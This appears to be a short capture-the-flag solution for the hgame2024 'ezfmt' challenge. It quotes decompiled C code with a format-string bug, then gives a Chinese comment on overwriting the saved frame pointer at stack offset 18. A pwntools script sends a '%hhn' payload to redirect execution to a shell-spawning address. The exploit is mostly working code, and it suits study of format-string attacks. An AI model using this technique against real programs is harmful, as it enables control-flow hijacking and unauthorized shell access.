'''
// hgame2024 ezfmt string https://chenxi9981.github.io/hgame2024_week1/
  strcpy((char *)buf, "make strings and getshell\n");
  write(0, buf, 0x1BuLL);
  read(0, s, 0x50uLL);
  if ( !strchr(s, 112) && !strchr(s, 115) )
    printf(s);
'''
# old ebp在第18个位置，修改这个地址，然后在栈里面写入sys的地址。
from pwn import *

context.arch = "amd64"
context.log_level = "debug"

p = process("./vuln")
# p = remote("47.100.137.175",31349)

payload = b'%72c%18$hhnaaaaa' + p64(0x40123D) * 6
p.sendafter(b'M3?\n', payload)

p.interactive()
